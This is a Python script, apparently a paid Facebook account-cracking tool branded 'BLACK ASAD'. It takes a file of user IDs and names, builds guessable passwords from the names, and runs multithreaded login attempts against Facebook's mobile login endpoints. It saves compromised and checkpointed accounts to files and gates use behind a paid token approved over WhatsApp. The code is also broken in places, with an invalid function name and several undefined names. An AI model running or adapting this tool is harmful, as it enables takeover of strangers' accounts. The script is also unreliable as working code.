#!/usr/bin/python3

#-*-coding:utf-8-*-

# Update V1.6

### Import Module

import os

try:

    import requests

except ImportError:

    print('\n Module requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n Module futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n Module bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid

from concurrent.futures import ThreadPoolExecutor as KINGHAMMAD

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

### WARNA RANDOM ###

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

#  CHIGOZIEWORLDWIDE.  #

#------------------------------->

############################ RESPONSE FACEBOOK ###########################################

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,pwBaru=[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; KSA-LX9 Build/HONORKSA-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

###########################################################################################

done = False

def animate():

    os.system("clear")

    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):

        if done:

            break

        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)

        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)

        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)

        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)

        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)

        sys.stdout.flush()

        time.sleep(0.03)

t = threading.Thread(target=animate)

t.start()

time.sleep(0.5)

done = True

# lempankkkkkkkk

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

# LO KONTOL

def logo():

	print("""\033[1;97m	

______ _       ___  _____  _   __ 

| ___ \ |     / _ \/  __ \| | / / 

| |_/ / |    / /_\ \ /  \/| |/ /  

| ___ \ |    |  _  | |    |    \  

| |_/ / |____| | | | \__/\| |\  \ 

\____/\_____/\_| |_/\____/\_| \_/ 

  ___   _____  ___ ______         

   / _ \ /  ___|/ _ \|  _  \        

   / /_\ \\ `--./ /_\ \ | | |        

   |  _  | `--. \  _  | | | |        

   | | | |/\__/ / | | | |/ /         

   \_| |_/\____/\_| |_/___/          

       """)

def reg():

    os.system('clear')

    logo()

    print ('')

    time.sleep(0.001) 

    try:

        to = open('/sdcard/Android/.bs7nt.txt', 'r').read()

    except (KeyError, IOError):

        reg2()

    r = requests.get('https://raw.githubusercontent.com/Famous-Hacker/XOSZ.txt/main/XOS.txt').text

    if to in r:

        time.sleep(2)

        python_java()

    else:

        os.system('clear')

        logo()

        print('')

        print ('\tApproved Not Detected')

        print ('')

        print (' \033[1;97mToken: ' + to)

        print(' WhatsApp : +923242761022')

        input('\033[1;97m Press Enter To Get Approval (PAID 300)')

        os.system('xdg-open https://wa.me/+923242761022?text=Assalamualaikum Sir Approve my Token and my Token :'+to)

        reg()

def reg2():

    os.system('clear')

    logo()

    print('')

    print ('\tApproval Not Detected')

    print('')

    id = uuid.uuid4().hex[:50]

    print (' Token : ' + id)

    print(' WhatsApp : +923242761022')

    input(' Press Enter To Get Approval (Paid 300) ')

    os.system('xdg-open https://wa.me/+923242761022?text=Hi Sir Can You Please approve my token :'+id)

    sav = open('/sdcard/Android/.bs7nt.txt', 'w')

    sav.write(id)

    sav.close()

    reg()

#MASUK TOKEN

def MR ASAD(OK,cp):

    if len(OK) != 0 or len(cp) != 0:

        print('\n----------------------------------------------')

        print(' Crack Has Been Completed.')

        print('----------------------------------------------')

        print(' [%s+%s] \033[1;92m SUCCESSFULL : %s --- \033[1;97m/sdcard/ASAD-OK.txt'%(O,O,str(len(ok))))

        print(' [%s+%s] \033[1;92m CHECKPOINTS : %s --- \033[1;97m/sdcard/ASAD-CP.txt'%(O,O,str(len(cp))))

        print('----------------------------------------------')

        input(f"\n\033[1;97m Press Enter To Return To Main Menu ")

        python_java()

def python_java():

    os.system('clear')

    logo()

    ipm = requests.get(url_ip).json() 

    IP = ipm["origin"]

    print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)

    print(" \033[1;96m AUTHOR     :      \033[1;92mBLACK ASAD")

    print(" \033[1;96m TEAM       :      \033[1;92mASAD")

    print(" \033[1;96m VERSION    :       \033[1;92m0.01")

    print(" \033[1;95m  YOTUBE  : TRICKER ASAD");time.sleep(0.03)

    print(" \033[1;97m IP ADDRESS        [%s]\n"%(IP));time.sleep(0.01)

    print(" \033[1;97m WHATSAPP   :  03242761022");time.sleep(0.03)

    print(" \033[1;92m   𝗚𝗜𝗩𝗘 𝗥𝗘𝗦𝗣𝗘𝗖𝗧 𝗧𝗔𝗞𝗘 𝗥𝗘𝗦𝗣𝗘𝗖𝗧 𝗠𝗥 BLACK ASAD")

    print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)

    print("\033[1;97m [1] FILE CRACK")

    print("\033[1;91m [0] EXIT")

    print("")

    pepek = input('\033[1;97m Select : ')

    if pepek in['1','01']:

       __xyz__().janu(id)

            

class __xyz__:

    def __init__(self):

        self.id = []

    def janu(self,id):

        os.system('clear')

        logo()

        print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)

        print("              FILE CRACK MENU")

        print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)

        print('')

        self.cnt = input('%s  TYPE FILE NAME :%s '%(P,K))

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        logo()

        input('%s  Press ENTER :%s '%(P,K))

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            os.system('clear')

            logo()

            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)

            print("\033[1;92              SELECT METHOD")

            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)

            print('')

            print(' [1] Method 1 (Quit Best)')

            print(' [2] Method 2 (Best)')

            chi = input('  Choose method: ')

            self.__pler__()

        else:

            print(' WRONG INPUT ');self.janu(id)

    def __metode__(self, user, __chi__, chachaji):

        global ok,cp,loop

        sys.stdout.write(f'\r [HA] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                header = {

                    "Host":chachaji,

                    "upgrade-insecure-requests":"1",

                    "user-agent":"Mozilla/5.0 (MeeGoNokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "dnt":"1",

                    "x-requested-with":"mark.via.gp",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://m.facebook.com/",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                r = session.get(f"https://{chachaji}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)

                das = {

                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),

                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),

                    "uid":user,

                    "flow":"login_no_pin",

                    "pass":pw,

                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"

                }

                header1 = {

                    "Host":chachaji,

                    "cache-control":"max-age=0",

                    "upgrade-insecure-requests":"1",

                    "origin":"https://"+chachaji,

                    "content-type":"application/x-www-form-urlencoded",

                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/97.0.4674.2 Mobile Safari/537.36",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "x-requested-with":"XMLHttpRequest",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://"+chachaji+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                po = session.post(f"https://{chachaji}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f'\r{A} [ASAD-OK] {user} | {pw}')

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/ASAD-OK.txt' , 'a').write('%s\n' % wrt)

                    self.follow(session,coki)

                    break

                elif 'checkpoint' in session.cookies.get_dict():

                    try:

                        tokenz = open('.token.txt').read()

                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']

                        month, day, year = cp_ttl.split('/')

                        month = bulan_ttl[month]

                        print('\r%s \033[1;91m[ASAD-CP] %s | %s ' % (K,user,pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('/sdcard/ASAD-CP.txt' , 'a').write('%s\n' % wrt)

                        break

                    except (KeyError, IOError):

                        month = ''

                        day   = ''

                        year  = ''

                    except:pass

                    print('\r%s \033[1;91m[ASAD-CP] %s | %s ' % (K,user,pw))

                    wrt = '%s|%s' % (user,pw)

                    cp.append(wrt)

                    open('/sdcard/ASAD-CP.txt' , 'a').write('%s\n' % wrt)

                    break

                else:

                    continue

            loop+=1

        except:

            self.__metode__(user, pw, chachaji)

    def __pler__(self):

        chi = ('2')

        if chi == '':

            print('\nSelect Correct One');self.__pler__()

        elif chi in ('1', '01'):

            os.system('clear')

            logo()

            print('')

            print(' \033[1;49;39m TOTAL IDZ : %s%s' %(len(self.id),O))

            print(' \033[1;93m BE PATIENT CRACK HAS BEEN ')

            print(' \033[1;92m IN THE BACKGROUND ')

            print('-------------------------------------------')

            print('')

            with BLACKASAD(max_workers=30) as kirim:

                for thankme in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = thankme.split('|')

                        xz = name.split(' ')

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]

                        else:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]

                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            MRHAMMAD(OK,cp)

        elif chi in ('2', '02'):

            os.system('clear')

            logo()

            print('')

            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)

            print(' \033[1;97m TOTAL IDZ : %s%s' %(len(self.id),O))

            print(' \033[1;97m BE PATIENT')

            print(' \033[1;97m CRACK HAS BEEN STARTED')

            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)

            print('')

            with KINGHAMMAD(max_workers=30) as kirim:

                for thankme in self.id: # CHECK_THE_POWER_OF_YOUR_DAD

                    try:

                        uid, name = thankme.split('|')

                        xz = name.split(' ')

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]

                        else:

                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]

                        kirim.submit(self.__metode__, uid, pwx, "x.facebook.com")

                    except:

                        pass

            MRASAD(OK,cp)

        else:

            print('\n Select Valid One');self.__pler__()

if __name__ == '__main__':

    reg()
